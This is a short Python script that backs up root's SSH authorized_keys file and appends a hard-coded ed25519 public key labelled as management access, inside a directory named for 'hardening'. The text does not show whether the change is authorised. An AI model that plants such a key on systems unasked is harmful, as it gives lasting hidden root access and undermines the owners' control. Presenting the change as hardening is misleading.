import pathlib,os,json
p=pathlib.Path('/root/.ssh/authorized_keys')
b=pathlib.Path('/root/wg-hardening-20261014')
b.mkdir(mode=0o700,exist_ok=True)
os.chmod(b,0o700)
if not (b/'authorized_keys.before').exists():
    (b/'authorized_keys.before').write_bytes(p.read_bytes() if p.exists() else b'')
    os.chmod(b/'authorized_keys.before',0o600)
k='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICmLGwzqBiEmUQLiZnjita3+WzltlRELoaaAuuXmcDJu axix-management-20261014'
old=p.read_text() if p.exists() else ''
if k.split()[1] not in old:
    p.write_text(old.rstrip()+'\n'+k+'\n')
os.chmod(p.parent,0o700)
os.chmod(p,0o600)
print(json.dumps({'installed':True,'key_count':len([l for l in p.read_text().splitlines() if l.strip() and not l.startswith('#')])}))